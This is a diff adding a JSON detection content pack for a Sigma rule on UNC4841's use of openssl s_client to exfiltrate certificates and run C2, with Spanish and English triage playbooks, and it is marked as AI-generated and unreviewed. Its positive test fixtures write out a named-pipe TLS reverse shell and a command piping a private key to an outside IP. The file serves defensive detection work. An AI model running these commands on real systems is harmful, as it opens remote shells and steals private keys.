@@ -1,0 +1,125 @@
+{
+  "rule": {
+    "id": "60911c07-f989-4362-84af-c609828ef829",
+    "title": "UNC4841 - SSL Certificate Exfiltration Via Openssl",
+    "level": "high",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_apt_unc4841_openssl_connection.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules-emerging-threats/2023/TA/UNC4841-Barracuda-ESG-Zero-Day-Exploitation/proc_creation_lnx_apt_unc4841_openssl_connection.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1140"
+    ],
+    "folder": "rules-emerging-threats"
+  },
+  "playbook": {
+    "es": {
+      "summary": "Un proceso openssl en Linux abrió una conexión TLS interactiva (s_client -quiet -connect) a una dirección IP literal en el puerto 443 u 8080. UNC4841 usó este patrón para exfiltrar certificados SSL y como canal C2 con named pipes.",
+      "what_it_detects": "Ejecuciones donde Image termina en /openssl y CommandLine contiene s_client, -quiet, -connect, una dirección IPv4 y :443 o :8080. Es decir, un cliente TLS crudo hacia una IP en lugar de un nombre de host.",
+      "why_it_matters": "openssl s_client -quiet funciona como un túnel cifrado genérico: puede enviar archivos (claves y certificados) o, junto con named pipes y un shell, ofrecer un reverse shell sobre TLS que se confunde con tráfico HTTPS. La regla está etiquetada como T1140 y se vincula a la explotación de Barracuda ESG por UNC4841.",
+      "triage_steps": [
+        "Revise CommandLine completo: anote la IP y el puerto de destino y busque redirecciones o pipes en ParentCommandLine (por ejemplo, mkfifo, < /tmp/..., | sh).",
+        "Identifique ParentImage y la cadena de procesos completa. Un shell, cron, perl o un proceso de servicio web o de correo como padre es más sospechoso que una sesión interactiva de un administrador.",
+        "Revise el usuario que ejecutó el comando y si se trata de una cuenta de servicio o root sin sesión SSH asociada.",
+        "Busque en el mismo host, en una ventana de +/- 15 minutos, comandos como mkfifo, cat sobre archivos .pem o .key, tar, base64, wget o curl, y la creación de archivos en /tmp.",
+        "Consulte la reputación de la IP de destino y busque en los logs de firewall o proxy el volumen transferido y la duración de la conexión.",
+        "Busque la misma IP de destino en otros hosts y revise alertas anteriores de este equipo, sobre todo si es un appliance de correo o un gateway."
+      ],
+      "false_positives": [
+        "Administradores que diagnostican TLS contra un servidor por su IP (por ejemplo, para revisar la cadena de certificados), algo poco común con -quiet.",
+        "Scripts de monitoreo o health checks que consultan endpoints internos por IP en los puertos 443 u 8080."
+      ],
+      "response_steps": [
+        "Valide con el dueño del sistema si la conexión era esperada. Si no lo era, aísle el host de la red sin apagarlo, para no perder evidencia en memoria.",
+        "Bloquee la IP de destino en el perímetro y busque conexiones hacia ella desde toda la organización.",
+        "Preserve la evidencia (named pipes, scripts, crontabs, historial de shell) y revise si hay persistencia antes de erradicar.",
+        "Si hubo acceso a certificados o claves privadas, revóquelos y reemítalos, y rote las credenciales del equipo."
+      ],
+      "severity_rationale": "La severidad es alta porque un cliente TLS crudo hacia una IP literal, con salida silenciada, rara vez es legítimo y coincide con una técnica documentada de exfiltración y C2."
+    },
+    "en": {
+      "summary": "A Linux openssl process opened a raw interactive TLS connection (s_client -quiet -connect) to a literal IP address on port 443 or 8080. UNC4841 used this pattern to exfiltrate SSL certificates and as a C2 channel through named pipes.",
+      "what_it_detects": "Executions where Image ends with /openssl and CommandLine contains s_client, -quiet, -connect, an IPv4 address and either :443 or :8080. In other words, a raw TLS client connecting to an IP instead of a hostname.",
+      "why_it_matters": "openssl s_client -quiet works as a generic encrypted pipe. It can push files such as keys and certificates out, or, combined with named pipes and a shell, give a TLS reverse shell that looks like HTTPS. The rule is tagged T1140 and is tied to UNC4841's exploitation of Barracuda ESG.",
+      "triage_steps": [
+        "Read the full CommandLine. Note the destination IP and port, and check ParentCommandLine for redirections or pipes (mkfifo, < /tmp/..., | sh).",
+        "Identify ParentImage and the full process tree. A shell, cron, perl or a mail or web service process as parent is more suspicious than an admin's interactive session.",
+        "Check which user ran it, and whether it was a service account or root with no matching SSH session.",
+        "On the same host within +/- 15 minutes, look for mkfifo, reads of .pem or .key files, tar, base64, wget or curl, and new files in /tmp.",
+        "Check the destination IP's reputation, and look up bytes transferred and connection duration in firewall or proxy logs.",
+        "Search for the same destination IP on other hosts, and review earlier alerts for this host, especially if it is a mail appliance or gateway."
+      ],
+      "false_positives": [
+        "Administrators troubleshooting TLS against a server by its IP, for example to inspect the certificate chain. Using -quiet for this is uncommon.",
+        "Monitoring scripts or health checks that query internal endpoints by IP on port 443 or 8080."
+      ],
+      "response_steps": [
+        "Confirm with the system owner whether the connection was expected. If it was not, isolate the host from the network but keep it powered on so memory evidence survives.",
+        "Block the destination IP at the perimeter and hunt for connections to it across the whole environment.",
+        "Preserve evidence (named pipes, scripts, crontabs, shell history) and look for persistence before you eradicate anything.",
+        "If certificates or private keys were accessed, revoke and reissue them, and rotate the host's credentials."
+      ],
+      "severity_rationale": "Severity is high because a raw, silenced TLS client connecting to a literal IP is rarely legitimate and matches a documented exfiltration and C2 technique."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "openssl s_client launched from a shell to an IP on port 443, with a named pipe in the parent command line (UNC4841-style C2).",
+        "event": {
+          "Image": "/usr/bin/openssl",
+          "CommandLine": "openssl s_client -quiet -connect 203.0.113.45:443",
+          "ParentImage": "/bin/sh",
+          "ParentCommandLine": "sh -c mkfifo /tmp/p; sh -i < /tmp/p 2>&1 | openssl s_client -quiet -connect 203.0.113.45:443 > /tmp/p",
+          "User": "root",
+          "ProcessId": 24811,
+          "hostname": "esg-gw-01"
+        }
+      },
+      {
+        "description": "openssl s_client sending data to an IP on port 8080.",
+        "event": {
+          "Image": "/usr/local/bin/openssl",
+          "CommandLine": "/usr/local/bin/openssl s_client -connect 198.51.100.23:8080 -quiet",
+          "ParentImage": "/bin/bash",
+          "ParentCommandLine": "bash -c cat /etc/ssl/private/server.pem | /usr/local/bin/openssl s_client -connect 198.51.100.23:8080 -quiet",
+          "User": "root",
+          "ProcessId": 30117,
+          "hostname": "esg-gw-01"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Admin checks a certificate by hostname, so there is no IP address and the regex does not match.",
+        "event": {
+          "Image": "/usr/bin/openssl",
+          "CommandLine": "openssl s_client -quiet -connect mail.example.com:443 -servername mail.example.com",
+          "ParentImage": "/bin/bash",
+          "User": "jperez",
+          "ProcessId": 5120,
+          "hostname": "bastion-01"
+        }
+      },
+      {
+        "description": "Admin connects by IP but without -quiet, so the |all requirement is not met.",
+        "event": {
+          "Image": "/usr/bin/openssl",
+          "CommandLine": "openssl s_client -connect 192.0.2.10:443 -showcerts",
+          "ParentImage": "/bin/bash",
+          "User": "jperez",
+          "ProcessId": 5177,
+          "hostname": "bastion-01"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-30T20:24:06+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
